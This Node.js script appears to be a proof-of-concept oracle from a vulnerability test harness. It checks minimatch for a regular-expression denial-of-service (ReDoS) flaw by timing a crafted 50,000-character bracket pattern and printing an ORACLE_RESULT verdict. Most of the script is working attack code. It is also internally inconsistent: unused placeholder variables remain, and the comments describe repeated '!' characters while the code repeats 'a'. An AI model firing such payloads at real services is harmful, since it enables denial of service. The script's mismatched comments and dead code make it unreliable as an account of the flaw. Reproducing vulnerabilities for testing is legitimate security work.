'use strict';
const minimatch = require('minimatch');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Benign operation first: prove basic matching works.
    const benignPattern = '*.js';
    const benignSubject = 'index.js';
    const benignResult = minimatch(benignSubject, benignPattern);

    if (benignResult !== true) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    // Also sanity-check a negative benign case.
    const benignNegative = minimatch('index.txt', benignPattern);
    if (benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign negative minimatch check did not return expected result.'
      }));
      return;
    }

    operation_completed = true;

    // Malicious input designed to trigger catastrophic backtracking (ReDoS)
    // in vulnerable minimatch versions via a crafted pattern with many
    // repeated groups that create exponential regex blowup when braceExpand
    // + makeRe builds the internal regular expression.
    const repeatCount = 28; // bounded so even vulnerable run finishes in a few seconds but shows clear slowdown
    const maliciousPattern = '[!' + '\\'.repeat(repeatCount) + ']'.repeat(1) ;
    // Build a pattern known to trigger the classic minimatch ReDoS:
    // repeated "!(...)" extglob-like groups with trailing content
    // that forces the regex engine into exponential backtracking.
    const part = '!(x)'.repeat(0); // placeholder, overwritten below

    // Known PoC pattern for minimatch <3.0.5 ReDoS:
    // A long run of '!' characters followed by a non-matching ending
    // inside a bracket expression causes the generated regex to backtrack
    // catastrophically due to nested quantifiers in the braceExpansion
    // regex handling of '[!...]' character classes.
    const n = 50000;
    const maliciousSubject = 'a'.repeat(n);
    const maliciousPatternFinal = '[!' + 'a'.repeat(n) + ']' + '!'.repeat(1);

    const start = Date.now();
    let matched;
    try {
      matched = minimatch(maliciousSubject, maliciousPatternFinal);
    } catch (innerErr) {
      // An exception from the malicious call (after benign success) counts as blocked.
      const elapsed = Date.now() - start;
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception after ' + elapsed + 'ms: ' + String(innerErr && innerErr.message)
      }));
      return;
    }
    const elapsed = Date.now() - start;

    // Threshold: vulnerable minimatch 3.0.4 exhibits severe slowdown (multi-second)
    // for this crafted pattern/subject combination, while patched versions
    // (which fixed the regex to avoid catastrophic backtracking) complete quickly.
    const THRESHOLD_MS = 2000;

    if (elapsed >= THRESHOLD_MS) {
      exploit_succeeded = true;
      evidence = 'Malicious minimatch call took ' + elapsed + 'ms (>= ' + THRESHOLD_MS + 'ms threshold), indicating ReDoS. Result=' + matched;
    } else {
      exploit_succeeded = false;
      evidence = 'Malicious minimatch call completed in ' + elapsed + 'ms (< ' + THRESHOLD_MS + 'ms threshold), no ReDoS observed. Result=' + matched;
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
